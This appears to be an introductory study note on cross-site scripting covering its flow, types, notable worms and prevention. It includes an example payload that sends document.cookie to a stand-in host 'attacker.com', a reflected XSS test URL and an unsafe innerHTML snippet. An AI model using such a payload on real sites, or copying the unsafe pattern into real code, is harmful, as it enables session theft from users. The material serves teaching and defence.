# WHAT IS XSS
## XSS (Cross-Site Scripting) – Full Concept + Notes
#  Introduction
Web applications accept user input (e.g., forms, comments, search fields). If this input is not properly sanitized, attackers can inject malicious scripts.
Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject JavaScript into web pages, which executes in the victim’s browser.

# What is XSS?
XSS is a client-side injection attack where malicious JavaScript runs in a user’s browser.

# Flow
User inputs data into a web application
Application fails to sanitize input
Attacker injects JavaScript code
Another user visits the page
Malicious script executes

# Key Points
XSS is a client-side vulnerability
It does not directly affect the server
It targets users of the application

# Risk Level
Impact: Low to Medium
Probability: High
Overall Risk: Medium

# What Can XSS Do?
  # Common Attacks
Steal session cookies
Perform actions as the user
Change account credentials
Inject malicious scripts (ads, crypto mining)
Execute unauthorized API requests

 # Example Payload
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>

  # Limitations of XSS
Cannot execute system-level code
Limited to browser environment
Restricted by same-origin policy

# Real-World Examples
 # Samy Worm (2005)
Exploited stored XSS in MySpace
Spread to over 1 million users in one day
 # TweetDeck XSS (Twitter)
Self-retweeting payload
Spread to 38,000 users in under 2 minutes

# Types of XSS

 # 1. Stored XSS (Persistent)
Most dangerous type
Malicious input is stored in the database
Executes whenever users load the page
Examples: Comment sections, forums
Flow:
Attacker injects script
Stored in database
Executes for every user

 # 2. Reflected XSS (Non-Persistent)
Input is reflected in the server response
Not stored on the server
Example:
http://example.com/search?q=<script>alert(1)</script>
Script executes when user clicks the link

 # 3. DOM-Based XSS
Occurs entirely on the client-side
Backend is not involved
Example:
document.getElementById("demo").innerHTML = location.hash;
If URL contains malicious script → executes


| Type          | Stored | Execution Location | Risk Level |
| ------------- | ------ | ------------------ | ---------- |
| Stored XSS    | Yes    | Server + Client    | High       |
| Reflected XSS | No     | Server Response    | Medium     |
| DOM-Based XSS | No     | Client Only        | Medium     |

# 📌 Prevention Techniques
Input validation and sanitization
Output encoding (HTML, JavaScript, URL)
Use secure frameworks (auto-escaping)
Implement Content Security Policy (CSP)
Avoid using innerHTML
